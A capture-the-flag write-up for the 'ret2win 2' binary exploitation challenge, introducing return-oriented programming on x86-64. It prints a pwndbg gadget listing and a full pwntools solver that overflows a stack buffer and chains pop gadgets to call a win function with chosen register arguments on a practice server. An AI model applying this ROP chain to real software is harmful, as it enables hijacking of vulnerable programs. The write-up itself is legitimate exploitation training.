---
description: Binary Exploitation
---

# ret2win 2

> _Introduction to Return Oriented Programming (ROP). Di arsitektur x86-64, 3 argumen pertama dari saat memanggil fungsi diambil dari register RDI, RSI, dan RDX. Dengan tools seperti ropper atau ROPgadget, kita bisa dapetin gadget yang bisa ngisi register-register itu dengan nilai yang kita inginkan._
>
> _Author: zran_

{% file src="../../.gitbook/assets/ret2win2 (1).zip" %}

My first introduction to using actual ROP to solve a challenge, learned stuff at ir0nstone and used the knowledge to perform "Ret2Win with Parameters". Since this was a 64-bit binary, I had to do register popping. But first, I had to find which variable was connected to which:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Looking at the disassembly for the win function, I saw three comparisons and fortunately they were easily recognizable with their register names of RDI, RSI, and RDX.

```
pwndbg> rop --grep pop
0x00000000004011fb : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401219 : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x0000000000401216 : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000004011f6 : mov byte ptr [rip + 0x2eab], 1 ; pop rbp ; ret
0x000000000040121c : mov ebp, esp ; pop rdi ; ret
0x000000000040121b : mov rbp, rsp ; pop rdi ; ret
0x0000000000401224 : nop ; pop rbp ; ret
0x00000000004011fd : pop rbp ; ret
0x000000000040121e : pop rdi ; ret
0x0000000000401222 : pop rdx ; ret
0x0000000000401220 : pop rsi ; ret
0x000000000040121a : push rbp ; mov rbp, rsp ; pop rdi ; ret
```

The author was nice enough to leave simple return gadgets for each required register pop, so here's the full solver script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win --host playground.tcp1p.team --port 19001
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2win')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'playground.tcp1p.team'
port = int(args.PORT or 19001)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

win = p64(0x401227)
POP_RDI = p64(0x40121e)
POP_RSI = p64(0x401220)
POP_RDX = p64(0x401222)
nop_ret = p64(0x40118f)

payload = b'A' * 120
payload += POP_RDI
payload += p64(0xdeadbeefdeadbeef)
payload += POP_RSI
payload += p64(0xabcd1234dcba4321)
payload += POP_RDX
payload += p64(0x147147147147147)
payload += nop_ret
payload += win

log.info(io.clean())
io.sendline(payload)
log.info(io.clean())

io.interactive()
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
